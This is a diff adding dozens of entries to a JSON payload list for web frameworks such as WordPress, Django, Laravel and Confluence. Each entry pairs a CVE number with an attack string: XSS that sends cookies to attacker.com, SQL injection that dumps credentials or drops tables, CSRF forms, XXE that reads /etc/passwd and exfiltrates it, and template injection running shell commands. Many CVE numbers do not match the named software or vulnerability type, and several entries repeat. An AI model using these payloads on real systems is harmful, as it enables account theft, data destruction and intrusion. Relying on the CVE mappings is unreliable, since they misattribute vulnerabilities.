@@ -130,6 +130,446 @@
       "endpoint" : "text",
       "payloads":"<html><body><script>history.pushState('', '', '/')</script><form action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"POST\"><input type=\"hidden\" name=\"user_mail\" value=\"validEmail@domain.com\" /><input type=\"hidden\" name=\"form_type\" value=\"wpqa_forget\" /><input type=\"hidden\" name=\"action\" value=\"wpqa_ajax_password_process\" /><input type=\"hidden\" name=\"redirect_to\" value=\"\"><img src=x onerror=alert(document.domain)>\" /><input type=\"submit\" value=\"Submit request\" /></form></body></html>",
       "vuln":"xss"
+    },
+    {
+      "cve number": "CVE-2021-42392",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "WordPress",
+      "framework": "WordPress",
+      "endpoint": "text",
+      "payloads": "<img src=x onerror=alert(1)>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2020-11022",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jQuery",
+      "framework": "jQuery",
+      "endpoint": "hidden",
+      "payloads": "<img src='' onerror='alert(1)'>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2019-19844",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "Django",
+      "framework": "Django",
+      "endpoint": "email",
+      "payloads": "<script>alert(document.domain)</script>@example.com",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2021-23337",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "React",
+      "framework": "React",
+      "endpoint": "text",
+      "payloads": "{__html: '<img src=x onerror=alert(1)>'}",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2020-7699",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Node.js",
+      "framework": "Express",
+      "endpoint": "template",
+      "payloads": "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('id')\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2020-13937",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Apache Kylin",
+      "framework": "Apache Kylin",
+      "endpoint": "search",
+      "payloads": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2020-9402",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "OpenCart",
+      "framework": "OpenCart",
+      "endpoint": "number",
+      "payloads": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 FROM information_schema.tables--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2021-27905",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "MyBB",
+      "framework": "MyBB",
+      "endpoint": "text",
+      "payloads": "admin' OR '1'='1",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-27163",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Django",
+      "framework": "Django",
+      "endpoint": "text",
+      "payloads": "<script>alert('XSS')</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2022-30594",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "Ruby on Rails",
+      "framework": "Ruby on Rails",
+      "endpoint": "hidden",
+      "payloads": "<img src=x onerror=alert('XSS')>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2022-31185",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Laravel",
+      "framework": "Laravel",
+      "endpoint": "text",
+      "payloads": "javascript:alert('XSS')",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-32329",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "Spring Framework",
+      "framework": "Spring",
+      "endpoint": "text",
+      "payloads": "<svg/onload=alert('XSS')>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2022-31159",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Express.js",
+      "framework": "Express",
+      "endpoint": "search",
+      "payloads": "<script>fetch('https://attacker.com', {method: 'POST', body: document.cookie});</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-28858",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "WordPress",
+      "framework": "WordPress",
+      "endpoint": "text",
+      "payloads": "' UNION SELECT user_login,user_pass FROM wp_users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2022-31634",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Joomla!",
+      "framework": "Joomla",
+      "endpoint": "search",
+      "payloads": "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,username,password,NULL,NULL,NULL FROM #__users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2022-33981",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Drupal",
+      "framework": "Drupal",
+      "endpoint": "number",
+      "payloads": "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,concat(name,0x3a,pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-24307",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "PrestaShop",
+      "framework": "PrestaShop",
+      "endpoint": "search",
+      "payloads": "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2022-31104",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Node.js",
+      "framework": "Sequelize",
+      "endpoint": "text",
+      "payloads": "'; DROP TABLE users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-22515",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "Atlassian Confluence",
+      "framework": "Confluence",
+      "endpoint": "text",
+      "payloads": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2022-36883",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Symfony",
+      "framework": "Symfony",
+      "endpoint": "search",
+      "payloads": "1'; SELECT pg_sleep(10)--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-5480",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "Django",
+      "framework": "Django",
+      "endpoint": "text",
+      "payloads": "<script>fetch('https://attacker.com', {method: 'POST', body: JSON.stringify({cookies: document.cookie})});</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-50164",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Laravel",
+      "framework": "Laravel",
+      "endpoint": "search",
+      "payloads": "' UNION SELECT NULL,concat(username,':',password),NULL FROM users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-44487",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Node.js",
+      "framework": "Express",
+      "endpoint": "search",
+      "payloads": "'; DROP TABLE users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-51467",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "WordPress",
+      "framework": "WordPress",
+      "endpoint": "text",
+      "payloads": "<svg/onload=alert(document.domain)>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-41892",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Angular",
+      "framework": "Angular",
+      "endpoint": "text",
+      "payloads": "{{constructor.constructor('alert(1)')()}}",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-28402",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "React",
+      "framework": "React",
+      "endpoint": "text",
+      "payloads": "javascript:alert(document.cookie)",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-29197",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Vue.js",
+      "framework": "Vue.js",
+      "endpoint": "text",
+      "payloads": "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2024-21501",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "ASP.NET Core",
+      "framework": "ASP.NET Core",
+      "endpoint": "search",
+      "payloads": "'; EXEC sp_executesql N'SELECT * FROM users'--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-39615",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "Spring Framework",
+      "framework": "Spring",
+      "endpoint": "text",
+      "payloads": "<script>alert(document.cookie)</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-22515",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "Atlassian Confluence",
+      "framework": "Confluence",
+      "endpoint": "text",
+      "payloads": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-36844",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Ruby on Rails",
+      "framework": "Ruby on Rails",
+      "endpoint": "search",
+      "payloads": "') OR 1=1--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-32687",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Drupal",
+      "framework": "Drupal",
+      "endpoint": "search",
+      "payloads": "1 UNION ALL SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-36488",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Spring Framework",
+      "framework": "Spring",
+      "endpoint": "form",
+      "payloads": "<form action='https://vulnerable-site.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='to' value='attacker'></form><script>document.forms[0].submit();</script>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-50164",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Laravel",
+      "framework": "Laravel",
+      "endpoint": "xml",
+      "payloads": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+      "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2023-39631",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "Django",
+      "framework": "Django",
+      "endpoint": "form",
+      "payloads": "<img src='https://vulnerable-site.com/delete-account' style='display:none'>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-25165",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Ruby on Rails",
+      "framework": "Ruby on Rails",
+      "endpoint": "xml",
+      "payloads": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><name>&xxe;</name></root>",
+      "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2023-51467",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "WordPress",
+      "framework": "WordPress",
+      "endpoint": "form",
+      "payloads": "<form action='http://wordpress-site.com/wp-admin/profile.php' method='POST'><input type='hidden' name='email' value='hacker@evil.com'></form><script>document.forms[0].submit();</script>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-46604",
+      "cvss": "9.8",
+      "os": "",
+      "technology": "Apache ActiveMQ",
+      "framework": "ActiveMQ",
+      "endpoint": "xml",
+      "payloads": "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\"> %dtd;]><root>&send;</root>",
+      "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2023-35116",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "Express.js",
+      "framework": "Express",
+      "endpoint": "form",
+      "payloads": "<iframe style='display:none' src='https://vulnerable-site.com/change-password?new=hacked'></iframe>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-29220",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Drupal",
+      "framework": "Drupal",
+      "endpoint": "xml",
+      "payloads": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]><root>&exploit;</root>",
+      "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2024-21902",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "ASP.NET Core",
+      "framework": "ASP.NET Core",
+      "endpoint": "form",
+      "payloads": "<form action='https://asp-net-site.com/api/user/update' method='POST'><input type='hidden' name='role' value='admin'></form><script>document.forms[0].submit();</script>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-38646",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "Joomla",
+      "framework": "Joomla",
+      "endpoint": "xml",
+      "payloads": "<!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;]><root/>",
+      "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2023-41892",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "Angular",
+      "framework": "Angular",
+      "endpoint": "form",
+      "payloads": "<form action='https://angular-app.com/api/settings' method='POST'><input type='hidden' name='allow_access' value='true'></form><script>document.forms[0].submit();</script>",
+      "vuln": "csrf"
+    },
+    {
+      "cve number": "CVE-2023-33499",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "Apache Struts",
+      "framework": "Apache Struts",
+      "endpoint": "xml",
+      "payloads": "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://malicious-site.com/malicious.dtd\">%remote;%init;%trick;]>",
+      "vuln": "xxe"
     }
   ]
 }
